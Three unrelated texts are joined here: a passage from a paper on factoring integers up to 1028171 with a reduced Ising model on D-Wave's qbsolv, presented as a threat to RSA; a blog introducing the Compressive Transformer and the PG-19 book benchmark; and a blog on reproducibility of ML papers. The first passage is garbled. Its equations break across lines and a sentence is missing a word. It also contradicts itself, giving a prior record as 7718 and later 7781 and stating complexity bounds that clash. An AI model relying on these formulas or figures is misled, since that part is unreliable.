In the case when the factorization increases in Shuxian Jiang et al.[30]( the growing number of qubits and the huge coupler strength in the theoretical quantum model will result in a nontrivial impact on the QA precision in the real D-Wave machine. Especially for limit-connectivity hardware, too high of costs regarding the number of qubits greatly limits the generalization and scalability of the factorization in large cases. In addition, the reduction from the 3-local term to the 2-local term increases the coupler strength and local field coefficient, especially for large integers.
This paper proposes a new model that addresses two perspectives: saving qubit resources and simplifying the quantum model to factor larger integers with fewer qubits. Using this way, we can reduce the number of involved qubits and the range of the coupler strength between qubits without any loss of generalization. It is expected to solve larger integers with fewer qubits so that the D-Wave can provide a more powerful capacity to factor large integers in the future.
Optimization of model parameters
In Ising model in ref. [30]( they did not consider the restrictions on the final model derived from the target values, which may cause too many carries to be involved in the model. Here we introduce the constraints derived from the difference between the target values and the maximal output of each column. The carries involved can be directly removed in some cases.
As shown in the improved multiplication table of Table [2]( because all variables have values of 0,1
, according to the first entry p1+q1=1
of column 2,p1q1=0
can be obtained. The second entryp2+p1q1+q2=1
in column 2 is simplified top2+q2=1
. Therefore, there is no carry from column 2 to column 3, that is, c1=0
. Thus, only two carries (c3
) are needed to represent the carry from column 3 into column 4. In addition, we can get p1=1−q1
according top1+q1=1
, respectively. Finally, the factorization of 143 only requires 5 qubits, a significant improvement compared to the original model with 12 qubits[30](
Based on the optimization of ref. [32]( the final parameters of the model are as follows:
Actually, the method of ref. [32]( is designed to reduce the number of qubits, and thus the improvements to the complexity of the model are limited. The main reason is that there is a “2” in Eq. [(20)]( which leads to many high coupler strengths and local field coefficients in the final Hamiltonian resulting in fragile quantum states. Therefore, another optimization should be proposed to solve the above problem without the loss of generalization and scalability.
As mentioned above, we mainly focus on the optimization of the model parameters. Jiang et al.[30]( a way to reduce the 3-local term to a 2-local term, which increased the local field coefficient and coupler strength parameters, especially for large integers. In the integer factorization problem based on quantum annealing, the reduction of the model parameters is beneficial to reducing the hardware requirements and the precision of quantum annealing. To reduce the 3-local term to a 2-local term in the integer factorization process, inspired by ref. [35]( we optimize Eq. [(20)]( of ref. [32]( and form a new dimension reduction method from the 3-local term to 2-local term, as shown in Eq. [(26)](
The negative term −x1x2x3=−minx4(x4x3+2(x1x2−2x1x4−2x2x4+3x4))
is the same as ref. [30]( We mainly prove our optimization of the positive term, that is, why the positive term x1x2x3=minx4(x4x3+x1x2−x1x4−x2x4+x4)
Table [3]( is a combination of 16 values of x1
, x2
, x3
, and x4
. The values of x1
, x2
, x3
, and x4
are 0 or 1. The output of is given in the last column, followed by√
to represent whetherx1x2x3
+ x4) or not. As mentioned earlier, the integer factorization problem is the problem of finding the minimum value of a function. In other words, solving the minimum value of x1x2x3
is the same as solvingminx4(x4x3+x1x2−x1x4−x2x4+x4)
). Take the first two rows of the Table [3]( as an example for the following illustration.

In this case, where x1=0
, x2=0
, and x3=0
are fixed,x1x2x3=0
; when x4=0
, x4x3+x1x2−x1x4−x2x4
+ x4 = 0; when x4=1
, x4x3+x1x2−x1x4−x2x4+x4=1
. Therefore, minx4(x4x3+x1x2−x1x4−x2x4+x4)=0
. At this time, x1x2x3
is equivalent tominx4(x4x3+x1x2−x1x4−x2x4+x4)
, and so x1x2x3=minx4(x4x3+x1x2−x1x4−x2x4+x4)
The dimension reduction method in this paper is not only applicable to the integer 143, but it is also applicable to the case where the polynomial of the objective function of any integer is greater than the quadratic term, such as the factorization of the 20-bit integer 1028171. A detailed analysis of the factorization is shown in the supplemental material. The method is universal and extensible. We do the following analysis. Assume that the objective function of the integer factorization is as follows:
where g(x)
are polynomials composed of two-local terms and 3-local terms, respectively. Then, it can be transformed based on Eq. [(27)]( as follows:
Therefore, the minimum value that solves the objective function S(x)min
is equivalent to the minimum value of solving the 3-local termf(x)
, namely, the value of minxn(xnxk+xixj−xixn−xjxn+xn)
. Therefore, the objective function S(x)min
has the same solution asS′(x)minxn
. Similarly, we analyze the 4-local term in the function. f(xi,xj,xk,xl)
is a polynomial composed of 4-local terms. We considerxk
as a whole, and obtain Eq.[(30)]( via minxn(xnxk+xixj−xixn−xjxn+xn)
For the 3-local term xnxkxl
in Eq.[(30)]( the dimensionality reduction formula minxn(xnxk+xixj−xixn−xjxn+xn)
is used again to obtain the following:
Finally, the final 4-local term is reduced to a 2-local term as follows:
In this way, the minimum value of the 3-local term and 4-local term can be transformed to a simpler polynomial with simple connections characterized by quadratic terms. The coupler strength and local field coefficient can be reduced further and the theoretical model can work better to describe the original problem with high precision in the simulations.
All the simulations are performed via MATLAB 2014 and Python 3.6 with the qbsolv software environment (provided by D-Wave), which can successfully factor 1028171. For more information about the integer 1028171, please refer to the supplemental material. Table S[1]( of the supplemental material shows the factorization of integer 1028171. The qbsolv software environment is a decomposition solver that finds the minimum value given by a QUBO problem by splitting it into pieces that are solved either via a D-Wave system or a classical tabu solver. For more information about the tool, please refer to The simulations are based on the combination of the two optimizations, which can be divided into the following steps.
Step 1. Give the improved multiplication table of Jiang et al.[30]( that is divided into several columns. It’s complexity is less than O(log2(N))
Step 2. Give the original model based on the optimization in ref. [32]( The complexity of this step is less than O((log2(N))3)
Step 3. Give the final QUBO model based on the optimization of the model parameters. It’s complexity is less than O((log2(N))3)
Step 4. Transform it to Ising model via xi=(1−si)/2,i=1,2,3,⋯
, which is required for the quantum computing software environment. Note: xi
variables are mapped tosi
variables that could be processed by Ising model by the formulaxi=(1−si)/2,i=1,2,3,⋯
. The complexity of this step is O(1)-
Step 5. Perform the simulations using the quantum computing software environment. By inputting the parameter values of h
in theqbsolv quantum computing software, the quantum annealing algorithm factors the integers. It’s complexity is less than O((log2(N))2)
In the above simulations, Steps 1–4 are classical calculations, and the complexity is less than O((log2(N))3)
. Step 5 performs a quantum annealing calculation. The complexity increases as the integer to be factored becomes larger, and the overall complexity is less than O((log2(N))2)
. This algorithm realizes the hybrid computing structure of quantum and classical, and exerts the optimal computing power of the distributed processing problem of both quantum and classical.
Take the factorization on 143 as an example, the final input is given as follows:
Due to the accuracy of the error correcting and quantum manipulation technique, the short-time decoherence, the susceptibility to various noises, etc., the progress of universal quantum devices is slow, which limits the development and practical applications of Shor’s algorithm. The maximum factorization ability of Shor’s algorithm is currently the integer 85. However, D-Wave quantum computers have rapidly developed, and the number of qubits has been doubling every other year. Based on the quantum annealing method, we factor the integer 1028171. Although our method requires more qubits than Shor’s algorithm to factor the same integer, Shor’s algorithm is highly dependent on high-precision hardware. Actually, Science, Nature, and the National Academies of Sciences (NAS) are consistent in that it will be years before code-cracking by a universal quantum computer is achieved.
The existing works based on NMR utilize the special properties of certain primes to perform principle-of-proof experiments. The maximum integer of factorization based on an NMR platform is 291311. The integer factorization method based on the NMR platform is not applicable to all integers and is not universal and scalable.
Actually, our method is general and can factor up to 20-bit (1028171) integers, making it superior to the results obtained by any other physical implementations, including general-purpose quantum platforms (the Hua-Wei quantum computing platform), and far beyond the theoretical value (factor up to 10-bit integers) that can be obtained by the latest IBM Q System OneTM
if it can run Shor’s algorithm.
Table [4]( shows the parameter values of Jiang et al.’s method[30]( for integer factorization (please note that all the data of ref. [30]( are given via our simulations, just for reference). Table [5]( shows the factorization results of our method for the integers 143, 59989, 376289, 1005973 and 1028171. It can be seen from Table [5]( that our method can successfully factor the integers 1005973 and 1028171. Jiang et al.’s method can factor up to the integer 376289, whereas ours method can achieve the factorization of the integer 1028171, making it superior to the results obtained by any other physical implementations. The reduction of the qubits can reduce the hardware requirements of the quantum annealing machine and further boost the accuracy of quantum annealing, which has great practical significance. In the case of the hardware restrictions of the quantum machine, our goal is to achieve the factorization of a larger-scale integer 1028171 with fewer qubits, which is the best integer factorization result solved by the quantum algorithm.

Note: The values of the local field coefficient h
and coupler strengthJ
are the absolute values of the parameter ranges. Table [6]( takes the maximum integer 7718 that was factored by Warren, R.H.[34]( as an example and compares the coefficients of Ising model and qubits. In the actual quantum annealing experiment, the excessive coupling strength between the qubits reduces the possibility of reaching the ground state, and finally reduces the success rate of the integer factorization. It can be seen from Table [6]( that the proposed method achieves the lowest local field coefficient h
and coupling coefficientJ
, reduces the ranges of the coefficients of Ising model, and uses far fewer qubits than Warren, R.H.[34]( The reduction of the parameter value ranges can reduce the demand for qubit coupling strength, make the physical qubit flip unified, effectively increase the possibility of quantum annealing reaching the global optimal, and improve the success rate of integer factorization. In the case of insufficient precision and the immature development of existing quantum devices, the proposed method can effectively reduce the hardware requirements and improve the success rate of deciphering RSA via quantum annealing. In addition, our method successfully factors all integers within 10000, whereas Warren, R.H.[34]( traversed and factored all integers within 1000.
The integer factorization method based on the NMR platform uses the special properties of integers, and the method is not universal. The quantum annealing method based on a D-Wave quantum computer for integer factorization is limited by the hardware connection limitations of the D-Wave quantum computer, which are not enough to apply the method to larger integers.
This paper shows the optimistic potential of the quantum annealing algorithm for deciphering the RSA cryptosystem. A D-Wave using quantum annealing provides a new (second) way, which is a completely different way from Shor’s algorithm. The latest IBM Q System OneTM
can theoretically factor up to 10-bit integers using Shor’s algorithm, whereas our simulations showed the huge advantages of factoring 20-bit integers (1028171) using the quantum computing software environment provided by D-Wave. Our results are superior to the results obtained by any other quantum algorithm. Compared with ref. [32]( the local field coefficient h
and coupling term coefficientJ
of Ising model are optimized to reduce the range of the model parameters by more than 33% and 26%, respectively, which reduces the coupling strength between qubits, further improves the stability of qubit chains and further improves the upper bound of integer factorization. With the slow progress of general-purpose quantum computers and the limitation of D-Wave quantum computer’s topological connections, the stability of Ising model can be improved by reducing the local field coefficienth
and coupling coefficientJ
of Ising model, which can effectively improve the upper bounds of the decomposed integers.
From the perspective of practical code-cracking and generalization, we proposed a new general quantum spin model, which is a novel and further scalable way to conduct prime factorization with few qubits and QA. Lockheed Martin’s Warren, R.H.[34]( traversed and factored all integers within 1000. Our method successfully factors all integers within 10000 and has obtained the best index (20-bit integers (1028171)) of quantum computing for factoring integers. The result exceeded the work of Shuxian Jiang et al. (factor up to 376289)[30]( and Warren, R.H.[34]( (factor up to 7781).
At present, the fastest classical integer factorization algorithm is the number field sieve method. Its complexity is O(exp(c(logN)13)(loglogN)23)
and its complexity is exponential. In theory, Shor’s algorithm requires 2n qubits to factor n-bit integers, where n is the number of binary digits of the integer[13]( The complexity of our method is less than O(log2(N))
, where N
is the number to be factored. In terms of theoretical complexity, the complexity of Shor’s algorithm is better than the algorithm proposed in this paper. In terms of factoring the maximum integer index, due to the slow development of general quantum devices, Shor’s algorithm currently factor up to integer 85, and the maximum number that can be factored by the integer factorization method based on quantum annealing of our method is integer 1028171. To achieve the factorization of the integer 1028171, Shor’s algorithm requires more than 40 universal qubits, and the number of qubits and the precision of the quantum bits are far beyond the current hardware level. Therefore, through the analysis of the factored maximum integer index, the integer factorization method based on quantum annealing has more realistic attack power than Shor’s algorithm, which is expected to result in more advantages when using the real D-Wave quantum computing platform.
The current state of post quantum cryptography research exclusively referred to the potential threatens of Shor’s algorithm. From the above analysis, it can be seen that quantum annealing (the core principle of the D-Wave quantum computer) for prime factorization may be closer to cracking practical RSA codes than Shor’s algorithm. Furthermore, the experts of the post quantum cryptography international standard organization (in the 6th ETSI/IQC Quantum Safe Workshop) expressed great interest in our method. They analyzed the reason for neglecting the attacks from the D-Wave machine in post quantum cryptography research since the D-Wave computers, which have been purchased by Lockheed Martin, Google, etc., have been initially used for image processing, machine learning, combinatorial optimization, software verification, etc. Thus, post quantum cryptography research should further consider the potential of the D-Wave quantum computer for deciphering the RSA cryptosystem in future.
The structure of large integers will have an impact on the complexity of the model. Future research work will further study the effects of the structure of large integers on the model and the scalability of the integer factorization when using a D-Wave quantum computer to achieve larger-scale integer factorization.

@_subject: A new model and dataset for long-range memory 
We find the Compressive Transformer has state-of-the-art performance in the modelling of natural language for two widely-used long-range benchmarks, WikiText-103 and Enwik8, compared to [published results]( that do not use additional sources of training data. We also show it can be used effectively to model speech, handles rare words especially well, and can be used within a reinforcement learning agent to solve a memory task.
This blog introduces a new long-range memory model, the [Compressive Transformer]( alongside a new benchmark for book-level language modelling, [PG19]( We provide the conceptual tools needed to understand this new research in the context of recent developments in memory models and language modelling.
Throughout our lives, we build up memories that are retained over a diverse array of timescales, from minutes to months to years to decades. When reading a book, we can recall characters who were introduced many chapters ago, or in an earlier book in a series, and reason about their motivations and likely actions in the current context. We can even put the book down during a busy week, and pick up from where we left off without forgetting the plotline.
We do not achieve such feats by storing every detail of sensory input we receive about the world throughout our lifetimes. [Our brains select, filter, and integrate]( input stimuli based on factors of relevance, surprise, perceived danger, and repetition. In other words, we compress lifelong experience to a set of salient memories which help us understand the past, and better anticipate the future. A major goal of AI researchers is discovering ways of implementing such abilities in computational systems and benchmarks which require complex reasoning over long time-spans.
Memory systems for artificial neural networks have advanced considerably in the past two decades. In this post, we look to past advances to explore why this is such a difficult task and consider how natural language modelling could offer an effective means of designing better long range memory systems? We reflect on the necessity for better compressive memory architectures, and sparse memory access mechanisms, to work towards the goal of incorporating lifelong reasoning in our computational systems.
A brief history of memory in deep learning
[Nikola Tesla](
One of the earliest and most widely-used memory architectures in present day is a recurrent neural network (RNN) called the [Long Short-Term-Memory]( (LSTM). The LSTM maintains a compact memory in the form of a vector of numbers, which it accesses and modifies with gated read, write, and forget operations. It was originally developed on a suite of synthetic tasks that involved learning logical operations on a stream of bits. However, it has since become a ubiquitous model of sequential data: from recognising handwritten notes to predicting the early onset of kidney injury.
One weakness of the LSTM, and of many contemporary RNNs, is capacity. They are designed so that each unit of memory can influence every other unit in memory with a learnable weight. But this results in a computationally inefficient system:  the number of learnable parameters in the model grows quadratically with the memory size. For example, an LSTM with a memory of size 64KB results in parameters of size 8GB. Circumventing this memory capacity bottleneck has been an active research area.
[Figure 1. Long-range reasoning is crucial to general intelligence. Here, an agent remembers the existence and location of a key over a long period of time, and recalls this information when a treasure chest is discovered – prompting the agent to return to the remembered location to retrieve the key.]Figure 1. Long-range reasoning is crucial to general intelligence. Here, an agent remembers the existence and location of a key over a long period of time, and recalls this information when a treasure chest is discovered – prompting the agent to return to the remembered location to retrieve the key.
Researchers at DeepMind proposed a novel architecture, the [Differentiable Neural Computer]( (DNC), which augments an LSTM with a much larger memory matrix to address these deficits. The DNC uses an attention operation to read from this memory matrix. In visual attention, our eyes are drawn by pertinent objects in a visual scene–for example, one might typically spend more time observing a friend’s face during an emotional conversation than on noticing their shoes. Here, memory models can attend to particular events/data in the past. This attention operation requires a fixed number of parameters, independent of the memory size, and so the memory capacity of the model can be significantly increased.
Alongside the DNC, recurrent neural networks with an additional attention mechanism were showing promise in the domains of [translation](  and [question answering]( These models were able to reason over time using two memory structures: a small and compact LSTM memory and a large external memory. However, more recently researchers at Google Brain Team proposed the Transformer which removes the LSTM, and only uses attention to transmit [information across time](

The Transformer was originally shown to significantly outperform recurrent neural networks for machine translation. However it has since been applied to a range of applications in natural language processing, from question answering, document summarisation, sentiment classification and the modelling of natural language – a task that has seen particular exciting developments over the past year.
Modelling natural language
Finding machine learning tasks which both drive the development of better memory architectures and push us further towards artificial general intelligence is challenging. Statistical language modelling is one such task that we believe could be valuable for both purposes. Language models work by sequentially predicting the next word in a stream of text. They can be used to model existing texts and also to generate novel texts. As they get better at modelling the past, their predictions become more accurate, and the texts they generate become more realistic.
In Claude Shannon’s seminal article “[A Mathematical Theory of Communication]( published in 1948, which founded the field of information theory, he discussed primitive language models and illustrated how adding more context improves the quality and realism of generated text. He does this by introducing the most simple model of English text, which has no contextual modelling at all –  a character-level model which treats each character independently. By sampling characters with their relative frequencies (8% of the time for ‘a’, 1.5% for ‘b’ etc.) we arrive with a nonsensical string :
XFOML RXKHRJFFJUJ ZLPWCFWKCYJ FFJEYVKCQSGHYD QPAAMKBZAACIBZLHJQD.
However, he remarks at the improvement in sample quality if one instead models the probability of words independently. Now the modelled context is approximately 7X larger (the average number of characters in a word):
REPRESENTING AND SPEEDILY IS AN GOOD APT OR COME CAN DIFFERENT NATURAL HERE HE THE A IN CAME THE TO OF TO EXPERT GRAY COME TO FURNISHES THE LINE MESSAGE HAD BE THESE.
By modelling the probability of word pairs, a further 2X in context length, even more realistic text emerges:
THE HEAD AND IN FRONTAL ATTACK ON AN ENGLISH WRITER THAT THE CHARACTER OF THIS POINT IS THEREFORE ANOTHER METHOD FOR THE LETTERS THAT THE TIME OF WHO EVER TOLD THE PROBLEM FOR AN UNEXPECTED
In other words, an increase in the length of context leads to an improvement in the quality of text generated. Shannon remarks on the quality of his produced samples and conjectures that natural text samples may emerge from a sufficiently complex statistical model, “The particular sequence of ten words “attack on an English writer that the character of this” is not at all unreasonable. It appears then that a sufficiently complex stochastic process will give a satisfactory representation of a discrete source”.
One criticism of language modelling as a task for long-range reasoning is that models can capture a large portion of their predictions from the local context. Neural language models have traditionally ignored the wider context, focusing mostly on the short term. For example, in 2017 [Dailuk et al.]( found their neural language model rarely attends beyond the preceding five words. However in the past year large Transformer models have been shown to make use of hundreds of words of context to generate ever-more realistic text with a longer range of coherence. A demo from [OpenAI’s GPT-2]( a 1.5B parameter Transformer, indicate that the model is able to generate realistic text and retain key entities (e.g. Dr Jorge Pérez and unicorns) across multiple paragraphs:
The scientist named the population, after their distinctive horn, Ovid’s Unicorn. These four-horned, silver-white unicorns were previously unknown to science.
Now, after almost two centuries, the mystery of what sparked this odd phenomenon is finally solved.
Dr. Jorge Pérez, an evolutionary biologist from the University of La Paz, and several companions, were exploring the Andes Mountains when they found a small valley, with no other animals or humans. Pérez noticed that the valley had what appeared to be a natural fountain, surrounded by two peaks of rock and silver snow.
Pérez and the others then ventured further into the valley. “By the time we reached the top of one peak, the water looked blue, with some crystals on top,” said Pérez.
Pérez and his friends were astonished to see the unicorn herd. These creatures could be seen from the air without having to move too much to see them – they were so close they could touch their horns.
While examining these bizarre creatures the scientists discovered that the creatures also spoke some fairly regular English. Pérez stated, “We can see, for example, that they have a common ‘language,’ something like a dialect or dialectic.”
Dr. Pérez believes that the unicorns may have originated in Argentina, where the animals were believed to be descendants of a lost race of people who lived there before the arrival of humans in those parts of South America.
While their origins are still unclear, some believe that perhaps the creatures were created when a human and a unicorn met each other in a time before human civilization. According to Pérez, “In South America, such incidents seem to be quite common.”
However, Pérez also pointed out that it is likely that the only way of knowing for sure if unicorns are indeed the descendants of a lost alien race is through DNA. “But they seem to be able to communicate in English quite well, which I believe is a sign of evolution, or at least a change in social organization,” said the scientist.
Transferring knowledge
Such samples would likely astound Shannon, 70 years on from his early language model experiments. However the real benefit of powerful neural language models – and their relevance to the goal of AGI – is their ability to transfer knowledge to a suite of tasks. In the process of learning how to model text, neural language models appear to build up a knowledge-base of associations, and a plethora of skills.
For instance, researchers at OpenAI showed that GPT-2 can be applied to natural-language processing tasks such as question answering, paraphrasing, or sentiment analysis with surprisingly good performance – especially for a model that has never been explicitly trained to perform such tasks. When large Transformer language models are fine-tuned on particular tasks such as question answering, the resulting performance is significantly better than models that were designed and trained solely for question answering. Google’s prominent natural language model, [BERT]( achieves state-of-the-art performance on a wide array of NLP benchmarks, and is now [a part of Google Search]( And more recently, it was shown that GPT-2 can learn to play rudimentary chess by training it on strings of [game moves](
Benchmarking language models
A popular long-range language model benchmark is [WikiText-103]( which is comprised of English-language Wikipedia articles, and was developed by researchers at [Salesforce AI]( Articles are around 3,600 words on average, which, at the time of creation, was far beyond the memory window of state-of-the-art models.
However researchers at Google recently showed that a Transformer variant called the TransformerXL – which maintains a memory of past network activations and recently obtained state-of-the-art results on WikiText-103 – can make use of contexts spanning over [one thousand words]( This raises the question: will models soon saturate these benchmarks? As such, we’ve compiled and released a new, longer-range language model benchmark based on books.
A new dataset for long-term memory research
To support growing interest in long-range sequence models, we are releasing a new language modelling benchmark, [PG-19]( which is derived from books in the [Project Gutenberg online library](
Books provide a rich context for the development of long-range memory models.  We selected a subset of approximately 28,000 books from Project Gutenberg published before 1919. Unlike prior language modeling dataset releases, we apply very little pre-processing to the text. For example, we do not limit the vocabulary size of the data or censor numbers, to avoid the filtering of useful information.
PG-19 is over double the size of prior language modelling benchmarks, such as the [Billion Word Benchmark]( and contains text that is over 10X longer in context than the prior long-range language model benchmark, WikiText-103. We provide a comparative table of existing language modelling benchmarks, below:
Compressive Transformer
Alongside a new benchmark, we propose a long-range memory model called the [Compressive Transformer]( We take inspiration from the role of sleep in the formation of [consolidated episodic memories]( Sleep is known to be crucial for memory, and it’s thought that sleep serves to compress and consolidate memories, thereby improving reasoning abilities for memory tasks. In the Compressive Transformer, granular memories akin to episodic memories are collected online as the model passes over a sequence of inputs; over time, they are eventually compacted.
The Compressive Transformer uses attention to select information from the past, like the Transformer. It maintains a short-term memory of past activations, in the same style as the recently-proposed [TransformerXL]( Where the TransformerXL discards past activations when they become older, the Compressive Transformer instead compacts them into a compressed memory.  The compression is performed by a neural network guided by an auxiliary loss that guides it to keep around task-relevant information. It can learn to filter out irrelevant memories, as well as combine memories so that the salient information is preserved and retrievable over a longer period of time.
[Figure 3. Compressive Transformer: a long-range sequence attentive sequence model which characterises the past with a granular short-term memory with a coarse compressed memory.]Figure 3. Compressive Transformer: a long-range sequence attentive sequence model which characterises the past with a granular short-term memory with a coarse compressed memory.
We find the Compressive Transformer has state-of-the-art performance in the modelling of natural language for two widely-used long-range benchmarks, WikiText-103 and Enwik8, compared to [published results]( that do not use additional sources of training data. We also show it can be used effectively to model speech, handles rare words especially well, and can be used within a reinforcement learning agent to solve a memory task.
We find the Compressive Transformer produces the largest performance gain in modelling long-context book text from the PG-19 benchmark. The model’s conditional samples can be used to write book-like extracts. Below we show a sample that is fed a paragraph of text to be used as context, taken from “The Patrol of the Sun Dance” by Ralph Connor, which the model has not previously seen.
Context from The Patrol of the Sun Dance Trail by Ralph Connor
Along the tote-road, which ran parallel to the steel, a man, dark of skin, slight but wiry, came running, his hard panting, his streaming face, his open mouth proclaiming his exhaustion. At a little trail that led to the left he paused, noted its course toward the flaunting flag, turned into it, then struggled up the rocky hillside till he came to the wooden shack, with a deep porch running round it, and surrounded by a rustic fence which enclosed a garden whose neatness illustrated a characteristic of the British soldier. The runner passed in through the gate and up the little gravel walk and began to ascend the steps...
Continuation by the Compressive Transformer
 ...As though by mutual consent, all the three members of the Superintendent Force were standing on the veranda watching his progress, a man came strolling slowly down the path, stopping often to gaze curiously about him, then stopping once more when he saw the four standing on the veranda. His face was dark, his eyes prominent, and the lines that furrowed his forehead showed marks of many woes, yet his step was alert and he began to mount the steps with steady strides.
The man’s attention was diverted by the unexpected appearance of the two policemen; a third man came slipping up, grumbling under his breath, and stopped long enough to look doubtfully around him, then slipped away again. In the meantime, the four on the veranda continued to watch the approach of the new arrival. In spite of himself, the Superintendent Force became conscious of a curious feeling–uneasiness that was almost fear–in the presence of that strange man. He would not allow himself to admit the fact, yet he felt it in his bones. But to the watchers, the plain, everyday features of that stranger and his coming, seemed only just what the Seven White Shee owed him–their weight, their hurry, their blast...
The Compressive Transformer is able to produce narrative in a variety of styles, from multi-character dialogue, first-person diary entries, or third-person prose. Although the model does not have an understanding of language that’s grounded in the real world, or the events that take place in it – by capturing longer-range correlations, we see the emergence of more coherent text.
The future of memory architectures
As we strive to create agents that operate over days, weeks or even years, it will be impractical to compute over all raw input data at each timestep. Even with the current growth in computing power, we will need to develop compressive and sparse architectures for memory to build representations and reason about actions.
Models which are able to capture relevant correlations across days, months, or years’ worth of experience are on the horizon. We believe the route to more powerful reasoning over time will emerge from better selective attention of the past, and more effective mechanisms to compress it. As we explore ideas in this space, we need tasks and datasets that span longer and longer time intervals. The PG-19 dataset can help researchers move in this direction, presenting textual data in the longest form that we typically consume as humans: full-length books. We hope that its release will spur interest in new models that compress the past in order to predict the future and act effectively in the present.

@_subject: Quantifying Independently Reproducible Machine Learning 
Peer review has been an integral part of scientific research for [more than 300 years]( But even before peer review was introduced, reproducibility was a primary component of the scientific method. One of the first reproducible experiments was presented by Jabir Ibn Haiyan in 800 CE. In the past few decades, many domains have encountered high profile cases of non-reproducible results. The [American Psychological Association has struggled with authors failing to make data available]( A 2011 study found that only [6% of medical studies could be fully reproduced]( In 2016, a survey of researchers from many disciplines found that most had [failed to reproduce one of their previous papers]( Now, we hear warnings that Artificial Intelligence (AI) and Machine Learning (ML) [face their own reproducibility crises](
This leads us to ask: is it true? It would seem hard to believe, as ML permeates every smart-device and intervenes evermore in our daily lives. From helpful hints on how to [act like a polite human over email]( to Elon Musk’s [promise]( of self-driving cars next year, it seems like machine learning is indeed reproducible.
How reproducible is the latest ML research, and can we begin to quantify what impacts its reproducibility? This question served as motivation for my [NeurIPS 2019 paper]( Based on a combination of masochism and stubbornness, over the past eight years I have attempted to implement various ML algorithms from scratch. This has resulted in a ML library called [JSAT]( My investigation in reproducible ML has also relied on personal notes and records hosted on [Mendeley]( and Github. With these data, and clearly no instinct for preserving my own sanity, I set out to quantify and verify reproducibility! As I soon learned, I would be engaging in [meta-science]( the study of science itself.
What is Reproducible Machine Learning?
One does not simply follow the description in the paper. Before we dive in, it is important to define what we mean by reproducible. Ideally, full reproducibility means that simply reading a scientific paper should give you all the information you need to 1) set up the same experiments, 2) follow the same approach, and then 3) obtain similar results.
If we can get all the way to step 3 based solely on information present in the paper, we might call that independent reproducibility. In this example, our result is reproducible because we are able to get the same result, and independent because we have done so in an effort completely independent of the original publication.
But as our friend from the comic above might tell us, simply following the content of the paper isn’t always sufficient. If we can’t get to step 3 by using only the information in the paper (or from cited prior work), we would determine that the paper is not independently reproducible.
Some may wonder, why make this distinction between reproducibility and independent reproducibility? Almost all of AI and ML research is based on computer code. We don’t require the burden of expensive and labor-intensive chemical synthesis, waiting for bacteria in a petri dish to mature, or pesky human trials. It should be easy to simply get code from the authors, run that on the same data, and get the same results!
If you have never had to read a researcher's code before... you are doing pretty OK in life. Good job. Our aversion to using or asking for the authors code is more than fear of working with undocumented research-grade code. [Chris Drummond]( has [described the approach]( of using an author’s code as replicability, and made a very salient argument that replication is desirable, but not sufficient for good science. A paper is supposed to be the scientific distillation of the work, representing what we have learned and now understand to enable these new results. If we can’t reproduce the results of a paper without the authors code, it may suggest that the paper itself didn’t successfully capture the important scientific contributions. This is before we consider the possibility that there may be bugs in the code that actually benefit the results, or any number of other possible discrepancies between code and paper.
Another [great example]( from ICML this past year showed that even if we can replicate the results of a paper, slightly altering the experimental setup could have dramatically different results. For these reasons, we don’t want to consider the authors code, as this could be a source of bias. We want to focus on the question of reproducibility, without wading into the murky waters of replication.
What Makes a ML Paper Reproducible?
Feature	Important	My Reaction
Hyperparameters	✅	👍
Easy to Read	✅	👍
Equations per Page	✅	🤔
Empirical vs Rigor	✅	🤨
Pseudo Code	✅	🤯
Replies to Questions	✅	🤷
Include Toy Problems	❌	😭
Year Published	❌	😌
Open Source Code	❌	😱Some of the features that were/were not related with reproducibility, that I found the most interesting.
I reviewed every paper I have attempted to implement up to 2017, and filtered out papers based on two criteria: if the attempt would be biased by having looked at released source code, or if there was a personal relationship with the authors. For each paper, I recorded as much information as I could to create a quantifiable set of features. Some were completely objective (how many authors where on the paper), while others highly subjective (does the paper look intimidating)? The goal of this analysis was to get as much information as possible about things that might impact a paper’s reproducibility. This left me with 255 attempted papers, and 162 successful reproductions. Each paper was distilled to a set of 26 features, and statistical testing was done to determine which were significant. In the table to the right I've put what I think are the most interest and important results, along with my initial reactions.
Some of the results where unsurprising. For example, the number of authors shouldn’t have any particular importance to a paper’s reproducibility, and it did not have a significant relationship. Hyperparameters are the knobs we can adjust to change an algorithms behavior, but are not learned by the algorithm itself. Instead, we humans must set their values (or devise a clever way to pick them). Whether or not a paper detailed the hyperparameters used was found to be significant, and we can intuit why. If you don’t tell the reader what the settings where, the reader has to guess. That takes work, time, and is error prone! So, some of our results have given credence to the ideas the community has already been pursuing in order to make papers more reproducible. What is important is that we can now quantify why these are good things to be pursuing. Other findings follow basic logic, such as the finding that papers that are easier to read are easier to reproduce, likely because they are easier to understand.
I implore you to read the paper for a deeper discussion, but there are a few additional results that I think are particularly interesting; either because they challenge our assumptions about what we “know” a good paper is or lead to some surprising conclusions. All of these results are nuanced more than I can unpack in this article, but are worth mentioning if for nothing else but to stimulate a deeper conversation, and hopefully spur further research to answer these questions.
Finding 1: Having fewer equations per page makes a paper more reproducible.
Math is like catnip for reviewers. They just can't help themselves. It appears to be the case because the most readable papers use the fewest equations. We often see papers that have many equations and derivations listed, for any number of reasons. It appears that a careful and judicious use of equations makes things easier to read, primarily because you can use math selectively to communicate more effectively. This result clashes with the incentive structure of getting a paper published. On more than one occasion, reviewers have asked me to include more math in a paper. It may be that the math itself makes a paper more scientific or grounded in objectivity. While more specification may seem to be better, it is not synonymous with reproducibility. This is a cultural issue we need to address as a community.
Finding 2: Empirical papers may be more reproducible than theory-oriented papers.
There is considerable debate within the community about where and how much rigor needs to be normalized in the community. This is done under the guide that as a community, our focus should be on getting the best results for a given bench mark. Yet in optimizing for bench marks, we risk losing our understanding of what is actually happening and why these methods work. The inclusion of theoretical work and formal proofs do not cover all aspects of what might be meant by the term rigor. Given the common belief that elaborate mathematical proofs ensure a better understanding of a given method, it is interesting to see that greater mathematical specification isn’t necessarily making research easier to reproduce. The important point here is that papers containing a mix of theory and empirical emphasis have the same overall reproduction rates as purely empirical papers. An empirical bent can be helpful from the reproducibility perspective, but [could also hamper progress]( by creating perverse incentives and unintended side effects.
Finding 3: Sharing code is not a panacea
We have already touched upon the idea that reproduction via released code is not the same thing as reproduction done independently. Is this a difference without distinction? It is not! My results indicate that the open sourcing of code is at best a weak indicator of reproducibility. As conferences begin to more strongly encourage code submission and examination as part of the review process, I believe this is a crucial point. As a community, we need to understand what our goals are with such efforts and what we are actually accomplishing. Careful thought and consideration should go into this distinction if we ever make code submission mandatory, and the guidance we give reviewers to evaluate such code.
